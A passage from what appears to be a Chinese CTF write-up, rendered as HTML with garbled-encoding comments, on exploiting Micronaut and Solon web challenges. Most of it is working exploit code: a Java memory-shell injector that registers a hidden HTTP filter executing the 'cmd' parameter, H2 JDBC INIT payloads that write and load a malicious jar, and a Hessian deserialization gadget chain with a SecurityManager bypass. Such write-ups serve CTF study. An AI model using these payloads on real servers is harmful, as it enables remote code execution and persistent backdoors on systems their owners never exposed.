class="hljs-type">InternalThreadLocalMap</span> <span class="hljs-variable">threadLocalMap</span> <span class="hljs-operator">=</span> (InternalThreadLocalMap) unsafe.getObject(currentThread, threadLocalMapOffset);<br><br>                <span class="hljs-comment">// è·å–threadLocalMapä¸­çš„indexedVariables</span><br>                <span class="hljs-type">Field</span> <span class="hljs-variable">indexedVariablesField</span> <span class="hljs-operator">=</span> InternalThreadLocalMap.class.getDeclaredField(<span class="hljs-string">&quot;indexedVariables&quot;</span>);<br>                indexedVariablesField.setAccessible(<span class="hljs-literal">true</span>);<br>                Object[] indexedVariables = (Object[]) indexedVariablesField.get(threadLocalMap);<br><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">indexedVariable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                <span class="hljs-comment">// éå†indexedVariablesæ•°ç»„ï¼Œå¯»æ‰¾PropagatedContextImplç±»å‹çš„å˜é‡</span><br>                <span class="hljs-keyword">for</span> (Object variable : indexedVariables) &#123;<br>                    System.out.println(variable.getClass().getName());<br>                    <span class="hljs-keyword">if</span> (variable.getClass().getName().contains(<span class="hljs-string">&quot;PropagatedContextImpl&quot;</span>)) &#123;<br>                        indexedVariable = variable;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°äº†PropagatedContextImplç±»å‹çš„å˜é‡</span><br>                <span class="hljs-keyword">if</span> (indexedVariable != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// è·å–PropagatedContextImplçš„elementså±æ€§</span><br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">elementsField</span> <span class="hljs-operator">=</span> indexedVariable.getClass().getDeclaredField(<span class="hljs-string">&quot;elements&quot;</span>);<br>                    elementsField.setAccessible(<span class="hljs-literal">true</span>);<br>                    PropagatedContextElement[] elements = (PropagatedContextElement[]) elementsField.get(indexedVariable);<br><br>                    <span class="hljs-type">PropagatedContextElement</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> elements[<span class="hljs-number">0</span>];<br><br>                    <span class="hljs-comment">// åå°„è·å–elementçš„httpRequestå±æ€§</span><br>                    <span class="hljs-keyword">if</span> (element != <span class="hljs-literal">null</span> &amp;&amp; element.getClass().getName().contains(<span class="hljs-string">&quot;ServerHttpRequestContext&quot;</span>)) &#123;<br>                        <span class="hljs-comment">// è·å–ServerHttpRequestContextç±»ä¸­çš„httpRequestå­—æ®µ</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">httpRequestField</span> <span class="hljs-operator">=</span> element.getClass().getDeclaredField(<span class="hljs-string">&quot;httpRequest&quot;</span>);<br>                        httpRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">NettyHttpRequest</span> <span class="hljs-variable">httpRequest</span> <span class="hljs-operator">=</span> (NettyHttpRequest) httpRequestField.get(element);<br><br>                        <span class="hljs-comment">// è·å–channelHandlerContextå±æ€§</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">channelHandlerContextField</span> <span class="hljs-operator">=</span> NettyHttpRequest.class.getDeclaredField(<span class="hljs-string">&quot;channelHandlerContext&quot;</span>);<br>                        channelHandlerContextField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">channelHandlerContext</span> <span class="hljs-operator">=</span> channelHandlerContextField.get(httpRequest);<br><br>                        <span class="hljs-comment">// è·å–handlerå±æ€§</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> channelHandlerContext.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>                        handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> handlerField.get(channelHandlerContext);<br><br>                        <span class="hljs-comment">// è·å–requestHandlerå±æ€§</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">requestHandlerField</span> <span class="hljs-operator">=</span> handler.getClass().getDeclaredField(<span class="hljs-string">&quot;requestHandler&quot;</span>);<br>                        requestHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">requestHandler</span> <span class="hljs-operator">=</span> requestHandlerField.get(handler);<br><br>                        <span class="hljs-comment">// è·å–routeExecutorå±æ€§</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">routeExecutorField</span> <span class="hljs-operator">=</span> requestHandler.getClass().getDeclaredField(<span class="hljs-string">&quot;routeExecutor&quot;</span>);<br>                        routeExecutorField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">RouteExecutor</span> <span class="hljs-variable">routeExecutor</span> <span class="hljs-operator">=</span> (RouteExecutor) routeExecutorField.get(requestHandler);<br><br>                        <span class="hljs-comment">// è·å–routerå±æ€§</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">routerField</span> <span class="hljs-operator">=</span> routeExecutor.getClass().getDeclaredField(<span class="hljs-string">&quot;router&quot;</span>);<br>                        routerField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">DefaultRouter</span> <span class="hljs-variable">router</span> <span class="hljs-operator">=</span> (DefaultRouter) routerField.get(routeExecutor);<br><br>                        <span class="hljs-comment">// è·å–alwaysMatchesHttpFilterså±æ€§</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">alwaysMatchesHttpFiltersField</span> <span class="hljs-operator">=</span> router.getClass().getDeclaredField(<span class="hljs-string">&quot;alwaysMatchesHttpFilters&quot;</span>);<br>                        alwaysMatchesHttpFiltersField.setAccessible(<span class="hljs-literal">true</span>);<br>                        Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt; alwaysMatchesHttpFilters =<br>                                (Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt;) unsafe.getObject(router,<br>                                        unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField));<br><br>                        <span class="hljs-comment">// è·å–ç°æœ‰çš„è¿‡æ»¤å™¨åˆ—è¡¨</span><br>                        ArrayList&lt;GenericHttpFilter&gt; filters = alwaysMatchesHttpFilters.get();<br><br>                        <span class="hljs-comment">// åˆ›å»ºæ–°çš„è¿‡æ»¤å™¨</span><br>                        <span class="hljs-type">HttpServerFilter</span> <span class="hljs-variable">hackedFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerFilter</span>() &#123;<br>                            <span class="hljs-meta">@Override</span><br>                            <span class="hljs-keyword">public</span> Publisher&lt;MutableHttpResponse&lt;?&gt;&gt; doFilter(HttpRequest&lt;?&gt; request, ServerFilterChain chain) &#123;<br>                                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameters().get(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                                    <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                                    <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                                        isLinux = <span class="hljs-literal">false</span>;<br>                                    &#125;<br>                                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>                                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                                    output = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                                &#125; <span class="hljs-keyword">catch</span> (IOException ioe) &#123;<br>                                    ioe.printStackTrace();<br>                                &#125;<br><br>                                <span class="hljs-type">String</span> <span class="hljs-variable">finalOutput</span> <span class="hljs-operator">=</span> output;<br>                                <span class="hljs-keyword">return</span> Flux.from(chain.proceed(request))<br>                                        .doOnNext(response -&gt; &#123;<br>                                            response.body(finalOutput);<br>                                        &#125;);<br>                            &#125;<br>                        &#125;;<br><br>                        <span class="hljs-comment">// è·å–AroundLegacyFilterç±»</span><br>                        Class&lt;?&gt; aroundLegacyFilterClass = Class.forName(<span class="hljs-string">&quot;io.micronaut.http.filter.AroundLegacyFilter&quot;</span>);<br><br>                        <span class="hljs-comment">// ä½¿ç”¨Unsafeåˆ†é…AroundLegacyFilterçš„å®ä¾‹</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">legacyFilter</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(aroundLegacyFilterClass);<br><br>                        <span class="hljs-comment">// è·å–AroundLegacyFilterçš„æ„é€ å‡½æ•°</span><br>                        Constructor&lt;?&gt; constructor = aroundLegacyFilterClass.getDeclaredConstructor(HttpFilter.class, FilterOrder.class);<br>                        constructor.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å…è®¸è®¿é—®ç§æœ‰æ„é€ æ–¹æ³•</span><br><br>                        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªDynamic FilterOrderå®ä¾‹ï¼Œå›é€€æ’åºå€¼ä¸º0</span><br>                        <span class="hljs-type">FilterOrder</span> <span class="hljs-variable">dynamicOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterOrder</span>.Dynamic(<span class="hljs-number">0</span>);<br><br>                        <span class="hljs-comment">// è°ƒç”¨æ„é€ å‡½æ•°åˆå§‹åŒ–å®ä¾‹</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">aroundLegacyFilter</span> <span class="hljs-operator">=</span> constructor.newInstance(hackedFilter, dynamicOrder);<br><br>                        <span class="hljs-comment">// å°†æ–°çš„filteræ·»åŠ åˆ°filtersåˆ—è¡¨ä¸­</span><br>                        filters.add((GenericHttpFilter) aroundLegacyFilter);<br><br>                        <span class="hljs-comment">// æ›´æ–°alwaysMatchesHttpFilters</span><br>                        unsafe.putObject(router, unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField),<br>                                SupplierUtil.memoized(() -&gt; filters));<br><br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        System.out.println(<span class="hljs-string">&quot;elementä¸æ˜¯ServerHttpRequestContextç±»å‹ã€‚&quot;</span>);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    System.out.println(<span class="hljs-string">&quot;æœªæ‰¾åˆ°ç±»å‹ä¸ºPropagatedContextImplçš„å˜é‡ã€‚&quot;</span>);<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;å½“å‰çº¿ç¨‹ä¸æ˜¯Nettyçš„çº¿ç¨‹ç±»å‹ã€‚&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> hello.micronaut;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.google.gson.Gson;<br><span class="hljs-keyword">import</span> com.google.gson.GsonBuilder;<br><span class="hljs-keyword">import</span> hello.micronaut.bean.User;<br><span class="hljs-keyword">import</span> hello.micronaut.utils.BeanUtil;<br><span class="hljs-keyword">import</span> io.micronaut.http.HttpRequest;<br><span class="hljs-keyword">import</span> io.micronaut.http.HttpResponse;<br><span class="hljs-keyword">import</span> io.micronaut.http.MediaType;<br><span class="hljs-keyword">import</span> io.micronaut.http.client.HttpClient;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">//        String loadClassName = &quot;micronaut.poc.TestPoc&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;micronaut.poc.EvilFilter&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/b.jar&quot;</span>;<br><span class="hljs-comment">//        String loadClassMethodName = &quot;poc&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassMethodName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hacked&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassPoc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[n=&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,d=new(&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,new(&#x27;cn.hutool.db.ds.pooled.DbConfig&#x27;,&#x27;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS LOAD_JAR AS \\&#x27;void loadJar(String jarPath, String className, String methodName) throws Exception &#123;java.net.URL jarUrl = new java.net.URL(\\\&quot;file:\\\&quot; + jarPath)\\;java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;jarUrl&#125;)\\;Class&lt;?&gt; loadedClass = classLoader.loadClass(className)\\;Object instance = loadedClass.getDeclaredConstructor().newInstance()\\;java.lang.reflect.Method method = loadedClass.getMethod(methodName)\\;method.invoke(instance)\\;&#125;\\&#x27;\\;CALL LOAD_JAR(\\&#x27;&quot;</span> + loadClassPath + <span class="hljs-string">&quot;\\&#x27;, \\&#x27;&quot;</span> + loadClassName + <span class="hljs-string">&quot;\\&#x27;, \\&#x27;&quot;</span> + loadClassMethodName + <span class="hljs-string">&quot;\\&#x27;)\\;&#x27;,&#x27;1111&#x27;,&#x27;111&#x27;)),u=&#x27;cn.hutool.db.ds.pooled.PooledConnection&#x27;]&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jar2base64Path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/Users/a1234/data/codes/java/micronaut-poc/target/original-micronaut-poc-0.1.jar&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jar2base64</span> <span class="hljs-operator">=</span> jar2base64(jar2base64Path);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">writeJarPoc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[n=&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,d=new(&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,new(&#x27;cn.hutool.db.ds.pooled.DbConfig&#x27;,&#x27;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS BASE64_TO_JAR AS \\&#x27;void base64ToJar(String base64Data, String filePath) throws java.io.IOException &#123;byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data)\\;try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) &#123;fos.write(jarBytes)\\;&#125;&#125;\\&#x27;\\;CALL BASE64_TO_JAR (\\&#x27;&quot;</span> + jar2base64 + <span class="hljs-string">&quot;\\&#x27;,\\&#x27;&quot;</span> + loadClassPath + <span class="hljs-string">&quot;\\&#x27;)\\;&#x27;,&#x27;1111&#x27;,&#x27;111&#x27;)),u=&#x27;cn.hutool.db.ds.pooled.PooledConnection&#x27;]&quot;</span>;<br>        <br>        <span class="hljs-type">Gson</span> <span class="hljs-variable">gson</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GsonBuilder</span>()<br>                .create();<br><br>        <span class="hljs-type">BeanUtil</span> <span class="hljs-variable">beanUtil</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanUtil</span>();<br>        beanUtil.setUrl(<span class="hljs-string">&quot;http&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> gson.toJson(beanUtil, BeanUtil.class);<br>        System.out.println(json);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc1</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(json.getBytes()) + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + writeJarPoc + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + <span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc2</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(json.getBytes()) + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + loadClassPoc + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + <span class="hljs-string">&quot;admin&quot;</span>;<br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">poc1User</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, Base64.getEncoder().encodeToString(poc1.getBytes()));<br>        <span class="hljs-type">User</span> <span class="hljs-variable">poc2User</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, Base64.getEncoder().encodeToString(poc2.getBytes()));<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>        System.out.println(objectMapper.writeValueAsString(poc1User));<br>        System.out.println(<span class="hljs-string">&quot;send1&quot;</span>);<br>        sendPostRequest(<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="hljs-string">&quot;/hello/user&quot;</span>, objectMapper.writeValueAsString(poc1User));<br>        System.out.println(<span class="hljs-string">&quot;send2&quot;</span>);<br>        sendPostRequest(<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="hljs-string">&quot;/hello/user&quot;</span>, objectMapper.writeValueAsString(poc2User));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">jar2base64</span><span class="hljs-params">(String jarPath)</span> &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">jarFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(jarPath);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(jarFile)) &#123;<br>            <span class="hljs-type">byte</span>[] jarBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) jarFile.length()];<br>            fis.read(jarBytes);<br>            <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(jarBytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sendGetRequest</span><span class="hljs-params">(String url, String endpoint)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">HttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClient.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url))) &#123;<br>            HttpRequest&lt;String&gt; request = HttpRequest.GET(endpoint);<br>            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);<br>            <span class="hljs-keyword">return</span> response.body();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sendPostRequest</span><span class="hljs-params">(String url, String endpoint, String data)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">HttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClient.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url))) &#123;<br>            HttpRequest&lt;String&gt; request = HttpRequest.POST(endpoint, data)<br>                    .contentType(MediaType.APPLICATION_JSON); <span class="hljs-comment">// è®¾ç½® Content-Type å¤´</span><br>            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);<br>            <span class="hljs-keyword">return</span> response.body();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SU-ez-solon"><a href="#SU-ez-solon" class="headerlink" title="SU_ez_solon"></a>SU_ez_solon</h2><p>å•çº¯çš„æ‰¾é“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-meta">@Param(defaultValue = &quot;hello&quot;)</span> String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> object.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£é¢˜æ•´ä½“çš„æ€è·¯ä¸éš¾æƒ³åˆ°ï¼Œå› ä¸ºåœ¨ä¾èµ–ä¸­å¯ä»¥æ˜ç¡®çš„å‘ç°æœ‰<code>h2</code>å’Œ<code>jackson</code>ä¾èµ–ï¼Œä»è¿™ä¹Ÿèƒ½æ¨æµ‹å¾—å‡ºå‡ºé¢˜äººåä¹‹å…«ä¹æ˜¯è¦æ‰¾ä¸€ä¸ª<code>getter</code>åˆ°<code>jdbc</code>çš„é“¾å­ï¼Œä¸ä¼šæ˜¯æ‰“ä»€ä¹ˆäºŒæ¬¡ååºåˆ—åŒ–æˆ–è€…JNDIï¼Œ<code>h2</code>è‚¯å®šæ˜¯æœ€ç»ˆçš„sinkã€‚è¿™ä¸€æ­¥ç”¨<code>codeql</code>æˆ–è€…å…¶ä»–çš„é™æ€åˆ†æå·¥å…·å°±ä¼šå¾ˆå¿«å¾—å‡ºç»“æœã€‚</p><p>ç¬¬äºŒæ­¥æ˜¯å¯¹<code>securityManager</code>çš„ç»•è¿‡ï¼Œè¿™æœ‰ä¸¤ç§æ€è·¯</p><ul><li>é€šè¿‡ååºåˆ—åŒ–ç›´æ¥å…³é—­<code>securityManager</code></li><li>å†™<code>so</code>åŠ è½½è¿›è¡ŒäºŒæ¬¡åˆ©ç”¨</li></ul><p>è¿™é‡Œæ˜¯sofaçš„hessianï¼Œè‡ªå¸¦äº†ä¸€ä¸ªååºåˆ—åŒ–ç±»çš„é»‘åå•ï¼Œh2çš„ç›¸å…³databaseç›´æ¥è¢«banäº†ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±æ‰¾ä¸€ä¸ªæ–°çš„æ„é€ é“¾æ¥æ‰“ã€‚</p><p>è¿™é‡Œæ‰¾åˆ°çš„æ˜¯<code>org.noear.solon.data.util.UnpooledDataSource</code>æ¥è°ƒç”¨<code>getConnection()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">[JDBC Gadget] <br>&lt;org.noear.solon.data.util.UnpooledDataSource: java.sql.Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">()</span>&gt;<br> -&gt; &lt;java.sql.DriverManager: java.sql.Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(java.lang.String)</span>&gt;<br></code></pre></td></tr></table></figure><p>å³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSONObject.toString()-&gt;UnpooledDataSource.getConnection()-&gt;h2RCE<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç‚¹å°±æ˜¯ç»•è¿™ä¸ª<code>securityManager</code>ï¼Œå¯ä»¥</p><ul><li>é€šè¿‡ååºåˆ—åŒ–ç›´æ¥å…³é—­ securityManager</li><li>å†™ so åŠ è½½è¿›è¡ŒäºŒæ¬¡åˆ©ç”¨</li></ul><p><code>SecurityManager</code>çš„é™åˆ¶å¯ä»¥ç›´æ¥è°ƒç”¨<code>System.setSecurityManager(null); </code></p><p>è€Œä¸”ä¼ å‚åˆ«çœ‹èµ°çœ¼äº†ï¼Œè¿™é‡Œä¼ çš„ä¸æ˜¯helloæ˜¯dataã€‚ã€‚ã€‚</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>æ¥è‡ªSycloveræˆ˜é˜Ÿçš„wpï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 